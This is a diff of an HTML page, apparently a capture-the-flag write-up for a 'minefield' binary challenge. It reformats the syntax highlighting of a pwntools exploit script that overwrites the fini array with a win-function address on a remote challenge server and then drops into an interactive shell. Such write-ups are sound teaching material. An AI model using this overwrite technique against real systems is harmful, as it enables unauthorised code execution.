@@ -53,48 +53,32 @@
 <div>
     <img src="../imgs/cyber_apocalypse/minefield4.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
-from pwn import *
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
 
-elf = context.binary = ELF('./minefield')
-libc = elf.libc
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./minefield'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-local = False
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>
 
-if local:
-    p = elf.process()
-else:
-    host = '139.59.174.238'
-    port = 32093
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'139.59.174.238'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">32093</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-control = '6295672' #dec value of fini array
-win = '4196715'     #dec value of win function
+<span style="color: #839496">control</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'6295672'</span> <span style="color: #586e75; font-style: italic">#dec value of fini array</span>
+<span style="color: #839496">win</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'4196715'</span>     <span style="color: #586e75; font-style: italic">#dec value of win function</span>
 
-p.clean()
-p.sendline('2')
-log.info(p.readuntil('Insert type of mine: '))
-p.sendline(control)                    
-log.info(p.readuntil('Insert location to plant: '))
-p.sendline(win)                 
-log.info(p.clean())
-p.interactive()
-        </code>
-    </pre>
-</div>
-<br><br>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
+<span style="color: #839496">log</span><span style="color: #586e75">.</span><span style="color: #839496">info(p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'Insert type of mine: '</span><span style="color: #839496">))</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(control)</span>                    
+<span style="color: #839496">log</span><span style="color: #586e75">.</span><span style="color: #839496">info(p</span><span style="color: #586e75">.</span><span style="color: #839496">readuntil(</span><span style="color: #2aa198">'Insert location to plant: '</span><span style="color: #839496">))</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(win)</span>                 
+<span style="color: #839496">log</span><span style="color: #586e75">.</span><span style="color: #839496">info(p</span><span style="color: #586e75">.</span><span style="color: #839496">clean())</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
